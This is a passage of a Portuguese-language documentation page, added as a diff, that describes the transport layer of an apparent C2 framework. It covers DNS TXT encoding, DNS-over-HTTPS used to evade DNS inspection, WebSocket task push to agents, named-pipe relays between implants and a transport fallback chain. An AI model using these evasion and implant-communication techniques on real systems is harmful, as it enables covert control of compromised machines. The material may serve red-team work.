+<div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="kd">func</span><span class="w"> </span><span class="nx">EncodeTXTRecords</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">[]</span><span class="kt">string</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="w">    </span><span class="nx">encoded</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">EncodeBase32</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">records</span><span class="w"> </span><span class="p">[]</span><span class="kt">string</span>
+<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">encoded</span><span class="p">)</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="nx">MaxTXTLen</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// MaxTXTLen = 255</span>
+<a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="w">        </span><span class="nx">records</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">records</span><span class="p">,</span><span class="w"> </span><span class="nx">encoded</span><span class="p">[:</span><span class="nx">MaxTXTLen</span><span class="p">])</span>
+<a href="#__codelineno-8-6" id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="w">        </span><span class="nx">encoded</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">encoded</span><span class="p">[</span><span class="nx">MaxTXTLen</span><span class="p">:]</span>
+<a href="#__codelineno-8-7" id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-8-8" id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="w">    </span><span class="nx">records</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">records</span><span class="p">,</span><span class="w"> </span><span class="nx">encoded</span><span class="p">)</span>
+<a href="#__codelineno-8-9" id="__codelineno-8-9" name="__codelineno-8-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">records</span>
+<a href="#__codelineno-8-10" id="__codelineno-8-10" name="__codelineno-8-10"></a><span class="p">}</span>
+</code></pre></div>
+<p>O listener inicia <strong>UDP e TCP</strong> simultaneamente. TCP e necessario para respostas que excedem 512 bytes (comum com TXT records grandes):</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="nx">l</span><span class="p">.</span><span class="nx">server</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">mdns</span><span class="p">.</span><span class="nx">Server</span><span class="p">{</span><span class="nx">Addr</span><span class="p">:</span><span class="w"> </span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">Net</span><span class="p">:</span><span class="w"> </span><span class="s">"udp"</span><span class="p">,</span><span class="w"> </span><span class="nx">Handler</span><span class="p">:</span><span class="w"> </span><span class="nx">mux</span><span class="p">}</span>
+<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="nx">l</span><span class="p">.</span><span class="nx">tcpServer</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">mdns</span><span class="p">.</span><span class="nx">Server</span><span class="p">{</span><span class="nx">Addr</span><span class="p">:</span><span class="w"> </span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="nx">Net</span><span class="p">:</span><span class="w"> </span><span class="s">"tcp"</span><span class="p">,</span><span class="w"> </span><span class="nx">Handler</span><span class="p">:</span><span class="w"> </span><span class="nx">mux</span><span class="p">}</span>
+</code></pre></div>
+<h2 id="doh-client-dns-over-https">DoH Client (DNS-over-HTTPS)<a class="headerlink" href="#doh-client-dns-over-https" title="Permanent link">¶</a></h2>
+<p>O DoH transport envia queries DNS via HTTPS para resolvers publicos (Cloudflare, Google, Quad9). Isso e util quando:</p>
+<ul>
+<li>DNS direto esta bloqueado ou monitorado</li>
+<li>O trafego HTTPS para resolvers publicos e permitido</li>
+<li>Necessario evadir DNS inspection</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="c1">// pkg/transport/doh/client.go</span>
+<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="kd">var</span><span class="w"> </span><span class="nx">DefaultResolvers</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[]</span><span class="nx">ResolverConfig</span><span class="p">{</span>
+<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="w">    </span><span class="p">{</span><span class="nx">URL</span><span class="p">:</span><span class="w"> </span><span class="s">"https://1.1.1.1/dns-query"</span><span class="p">},</span><span class="w">      </span><span class="c1">// Cloudflare</span>
+<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="w">    </span><span class="p">{</span><span class="nx">URL</span><span class="p">:</span><span class="w"> </span><span class="s">"https://8.8.8.8/dns-query"</span><span class="p">},</span><span class="w">       </span><span class="c1">// Google</span>
+<a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="w">    </span><span class="p">{</span><span class="nx">URL</span><span class="p">:</span><span class="w"> </span><span class="s">"https://9.9.9.9:5053/dns-query"</span><span class="p">},</span><span class="w">  </span><span class="c1">// Quad9</span>
+<a href="#__codelineno-10-6" id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="p">}</span>
+</code></pre></div>
+<p>O client faz queries TXT via JSON API (<code>application/dns-json</code>) e tenta cada resolver em sequencia ate obter resposta.</p>
+<h2 id="websocket-listener">WebSocket Listener<a class="headerlink" href="#websocket-listener" title="Permanent link">¶</a></h2>
+<p>WebSocket oferece <strong>conexao persistente bidirecional</strong>, ideal para cenarios de baixa latencia onde o server precisa enviar tasks imediatamente (sem esperar check-in).</p>
+<h3 id="upgrade-e-message-loop">Upgrade e Message Loop<a class="headerlink" href="#upgrade-e-message-loop" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="c1">// pkg/transport/ws/listener.go</span>
+<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">l</span><span class="w"> </span><span class="o">*</span><span class="nx">Listener</span><span class="p">)</span><span class="w"> </span><span class="nx">handleUpgrade</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-11-3" id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="w">    </span><span class="nx">conn</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">websocket</span><span class="p">.</span><span class="nx">Accept</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">websocket</span><span class="p">.</span><span class="nx">AcceptOptions</span><span class="p">{</span>
+<a href="#__codelineno-11-4" id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="w">        </span><span class="nx">InsecureSkipVerify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="c1">// C2 flexibility</span>
+<a href="#__codelineno-11-5" id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="w">    </span><span class="p">})</span>
+<a href="#__codelineno-11-6" id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="w">    </span><span class="nx">l</span><span class="p">.</span><span class="nx">messageLoop</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">conn</span><span class="p">)</span>
+<a href="#__codelineno-11-7" id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="p">}</span>
+</code></pre></div>
+<p>O message loop roda em goroutine por conexao, processando JSON frames:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="kd">type</span><span class="w"> </span><span class="nx">wsMessage</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-12-2" id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="w">    </span><span class="nx">Type</span><span class="w">    </span><span class="kt">string</span><span class="w">          </span><span class="s">`json:"type"`</span>
+<a href="#__codelineno-12-3" id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="w">    </span><span class="nx">Payload</span><span class="w"> </span><span class="nx">json</span><span class="p">.</span><span class="nx">RawMessage</span><span class="w"> </span><span class="s">`json:"payload,omitempty"`</span>
+<a href="#__codelineno-12-4" id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="w">    </span><span class="nx">Data</span><span class="w">    </span><span class="p">[]</span><span class="kt">byte</span><span class="w">          </span><span class="s">`json:"data,omitempty"`</span>
+<a href="#__codelineno-12-5" id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="server-push">Server Push<a class="headerlink" href="#server-push" title="Permanent link">¶</a></h3>
+<p>Diferente de HTTP (pull-based), WebSocket permite server push — tasks podem ser enviadas proativamente:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">l</span><span class="w"> </span><span class="o">*</span><span class="nx">Listener</span><span class="p">)</span><span class="w"> </span><span class="nx">PushTasks</span><span class="p">(</span><span class="nx">agentID</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">tasks</span><span class="w"> </span><span class="p">[]</span><span class="nx">storage</span><span class="p">.</span><span class="nx">Task</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="w">    </span><span class="nx">cs</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">l</span><span class="p">.</span><span class="nx">conns</span><span class="p">[</span><span class="nx">agentID</span><span class="p">]</span>
+<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="w">    </span><span class="c1">// Cifra tasks em envelope</span>
+<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="w">    </span><span class="nx">env</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">transport</span><span class="p">.</span><span class="nx">Envelope</span><span class="p">{</span><span class="nx">MsgType</span><span class="p">:</span><span class="w"> </span><span class="nx">transport</span><span class="p">.</span><span class="nx">MsgTaskDispatch</span><span class="p">,</span><span class="w"> </span><span class="o">...</span><span class="p">}</span>
+<a href="#__codelineno-13-5" id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="w">    </span><span class="nx">encoded</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">transport</span><span class="p">.</span><span class="nx">Encode</span><span class="p">(</span><span class="nx">env</span><span class="p">,</span><span class="w"> </span><span class="nx">sessionKey</span><span class="p">)</span>
+<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">    </span><span class="c1">// Envia diretamente pela conexao aberta</span>
+<a href="#__codelineno-13-7" id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="w">    </span><span class="nx">l</span><span class="p">.</span><span class="nx">sendMessage</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">cs</span><span class="p">.</span><span class="nx">conn</span><span class="p">,</span><span class="w"> </span><span class="nx">wsMessage</span><span class="p">{</span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="nx">MsgTypeTaskDispatch</span><span class="p">,</span><span class="w"> </span><span class="nx">Data</span><span class="p">:</span><span class="w"> </span><span class="nx">encoded</span><span class="p">})</span>
+<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="gerenciamento-de-conexoes">Gerenciamento de Conexoes<a class="headerlink" href="#gerenciamento-de-conexoes" title="Permanent link">¶</a></h3>
+<p>O listener mantem mapa de conexoes ativas por agentID. Reconexoes substituem a conexao anterior:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">l</span><span class="w"> </span><span class="o">*</span><span class="nx">Listener</span><span class="p">)</span><span class="w"> </span><span class="nx">addConn</span><span class="p">(</span><span class="nx">agentID</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">conn</span><span class="w"> </span><span class="o">*</span><span class="nx">websocket</span><span class="p">.</span><span class="nx">Conn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">existing</span><span class="p">,</span><span class="w"> </span><span class="nx">ok</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">l</span><span class="p">.</span><span class="nx">conns</span><span class="p">[</span><span class="nx">agentID</span><span class="p">];</span><span class="w"> </span><span class="nx">ok</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="w">        </span><span class="nx">existing</span><span class="p">.</span><span class="nx">conn</span><span class="p">.</span><span class="nx">Close</span><span class="p">(</span><span class="nx">websocket</span><span class="p">.</span><span class="nx">StatusGoingAway</span><span class="p">,</span><span class="w"> </span><span class="s">"replaced"</span><span class="p">)</span>
+<a href="#__codelineno-14-4" id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-14-5" id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="w">    </span><span class="nx">l</span><span class="p">.</span><span class="nx">conns</span><span class="p">[</span><span class="nx">agentID</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">connState</span><span class="p">{</span><span class="nx">agentID</span><span class="p">:</span><span class="w"> </span><span class="nx">agentID</span><span class="p">,</span><span class="w"> </span><span class="nx">conn</span><span class="p">:</span><span class="w"> </span><span class="nx">conn</span><span class="p">}</span>
+<a href="#__codelineno-14-6" id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="p">}</span>
+</code></pre></div>
+<h2 id="named-pipe">Named Pipe<a class="headerlink" href="#named-pipe" title="Permanent link">¶</a></h2>
+<p>Named Pipe e usado para comunicacao <strong>intra-host</strong> entre implants. O cenario tipico: um implant com acesso externo (HTTPS) atua como relay para implants internos que so tem acesso local.</p>
+<h3 id="relay-architecture">Relay Architecture<a class="headerlink" href="#relay-architecture" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="c1">// pkg/transport/pipe/relay.go</span>
+<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="kd">type</span><span class="w"> </span><span class="nx">Relay</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="w">    </span><span class="nx">upstream</span><span class="w"> </span><span class="nx">Upstream</span>
+<a href="#__codelineno-15-4" id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="w">    </span><span class="nx">pipes</span><span class="w">    </span><span class="p">[]</span><span class="o">*</span><span class="nx">PipeConn</span>
+<a href="#__codelineno-15-5" id="__codelineno-15-5" name="__codelineno-15-5"></a><span class="p">}</span>
+<a href="#__codelineno-15-6" id="__codelineno-15-6" name="__codelineno-15-6"></a>
+<a href="#__codelineno-15-7" id="__codelineno-15-7" name="__codelineno-15-7"></a><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">Relay</span><span class="p">)</span><span class="w"> </span><span class="nx">HandleConn</span><span class="p">(</span><span class="nx">conn</span><span class="w"> </span><span class="o">*</span><span class="nx">PipeConn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-15-8" id="__codelineno-15-8" name="__codelineno-15-8"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-15-9" id="__codelineno-15-9" name="__codelineno-15-9"></a><span class="w">        </span><span class="nx">n</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">conn</span><span class="p">.</span><span class="nx">Read</span><span class="p">(</span><span class="nx">buf</span><span class="p">)</span><span class="w">           </span><span class="c1">// Le raw envelope do child</span>
+<a href="#__codelineno-15-10" id="__codelineno-15-10" name="__codelineno-15-10"></a><span class="w">        </span><span class="nx">resp</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">Forward</span><span class="p">(</span><span class="nx">buf</span><span class="p">[:</span><span class="nx">n</span><span class="p">])</span><span class="w">    </span><span class="c1">// Encaminha upstream (HTTPS/DNS/WS)</span>
+<a href="#__codelineno-15-11" id="__codelineno-15-11" name="__codelineno-15-11"></a><span class="w">        </span><span class="nx">conn</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">resp</span><span class="p">)</span><span class="w">                 </span><span class="c1">// Retorna resposta ao child</span>
+<a href="#__codelineno-15-12" id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-15-13" id="__codelineno-15-13" name="__codelineno-15-13"></a><span class="p">}</span>
+</code></pre></div>
+<p>O relay e transparente: envelopes do child implant passam inalterados para o upstream. O parent implant nao decifra nem modifica os envelopes — cada implant tem sua propria session key com o server.</p>
+<h3 id="platform-support">Platform Support<a class="headerlink" href="#platform-support" title="Permanent link">¶</a></h3>
+<p>Named Pipe usa APIs nativas:</p>
+<ul>
+<li><strong>Windows:</strong> <code>CreateNamedPipe</code> / <code>ConnectNamedPipe</code> (via <code>pkg/transport/pipe/pipe_windows.go</code>)</li>
+<li><strong>Linux/macOS:</strong> Unix domain sockets (via <code>pkg/transport/pipe/pipe_other.go</code>)</li>
+</ul>
+<h2 id="transport-chain-no-implant">Transport Chain no Implant<a class="headerlink" href="#transport-chain-no-implant" title="Permanent link">¶</a></h2>
+<p>O implant constroi uma <strong>cadeia de transports</strong> ordenada por prioridade. Se o transport primario falha, o Reconnector troca automaticamente para o proximo.</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="c1">// cmd/implant/transport.go</span>
+<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">BuildTransportChain</span><span class="p">(</span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">)</span><span class="w"> </span><span class="p">[]</span><span class="nx">ImplantTransport</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a><span class="w">    </span><span class="nx">prio</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">TransportPriority</span><span class="w"> </span><span class="c1">// e.g., ["https", "dns", "ws"]</span>
+<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">prio</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="w">        </span><span class="nx">prio</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="nx">cfg</span><span class="p">.</span><span class="nx">Transport</span><span class="p">}</span>
+<a href="#__codelineno-16-6" id="__codelineno-16-6" name="__codelineno-16-6"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-16-7" id="__codelineno-16-7" name="__codelineno-16-7"></a>
+<a href="#__codelineno-16-8" id="__codelineno-16-8" name="__codelineno-16-8"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">chain</span><span class="w"> </span><span class="p">[]</span><span class="nx">ImplantTransport</span>
+<a href="#__codelineno-16-9" id="__codelineno-16-9" name="__codelineno-16-9"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">prio</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-16-10" id="__codelineno-16-10" name="__codelineno-16-10"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">NewTransport</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">);</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-16-11" id="__codelineno-16-11" name="__codelineno-16-11"></a><span class="w">            </span><span class="nx">chain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">chain</span><span class="p">,</span><span class="w"> </span><span class="nx">t</span><span class="p">)</span>
+<a href="#__codelineno-16-12" id="__codelineno-16-12" name="__codelineno-16-12"></a><span class="w">        </span><span class="p">}</span>
+<a href="#__codelineno-16-13" id="__codelineno-16-13" name="__codelineno-16-13"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-16-14" id="__codelineno-16-14" name="__codelineno-16-14"></a>
+<a href="#__codelineno-16-15" id="__codelineno-16-15" name="__codelineno-16-15"></a><span class="w">    </span><span class="c1">// Garantia: sempre tem pelo menos HTTPS</span>
+<a href="#__codelineno-16-16" id="__codelineno-16-16" name="__codelineno-16-16"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">chain</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-16-17" id="__codelineno-16-17" name="__codelineno-16-17"></a><span class="w">        </span><span class="nx">chain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">chain</span><span class="p">,</span><span class="w"> </span><span class="nx">NewHTTPTransport</span><span class="p">(</span><span class="nx">cfg</span><span class="p">))</span>
+<a href="#__codelineno-16-18" id="__codelineno-16-18" name="__codelineno-16-18"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-16-19" id="__codelineno-16-19" name="__codelineno-16-19"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">chain</span>
+<a href="#__codelineno-16-20" id="__codelineno-16-20" name="__codelineno-16-20"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="logica-de-fallback">Logica de Fallback<a class="headerlink" href="#logica-de-fallback" title="Permanent link">¶</a></h3>
+<p>O <code>Reconnector</code> gerencia a rotacao (ver <a href="../implant-internals/">Implant Internals</a>):</p>
+<ol>
+<li><strong>Cada falha:</strong> rota dominio para proximo callback URL</li>
+<li><strong>N falhas consecutivas</strong> (default 10): troca para proximo transport na chain</li>
+<li><strong>M falhas totais</strong> (default 100): kill switch — implant termina</li>
+</ol>
+<p>Alem da rotacao de transport, cada falha tambem aplica <strong>exponential backoff com jitter</strong>:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-17-1" id="__codelineno-17-1" name="__codelineno-17-1"></a>backoff = min(base_sleep * 2^failures, max_backoff) +/- 25% jitter
+</code></pre></div>
+<h2 id="veja-tambem">Veja tambem<a class="headerlink" href="#veja-tambem" title="Permanent link">¶</a></h2>
+<ul>
+<li><a href="../protocol/">Protocolo</a> — formato do envelope carregado pelos transports</li>
+<li><a href="../crypto/">Criptografia</a> — cifragem dos payloads dentro dos envelopes</li>
+<li><a href="../implant-internals/">Implant Internals</a> — transport chain e reconnection logic</li>
+</ul>
+</article>
+</div>
+<script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy", "content.tabs.link", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+<script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+<script type="module">import mermaid from "https://unpkg.com/mermaid@10.4.0/dist/mermaid.esm.min.mjs";
+window.mermaidConfig = {default: {
+    startOnLoad: false
+}};</script></body>
+</html>
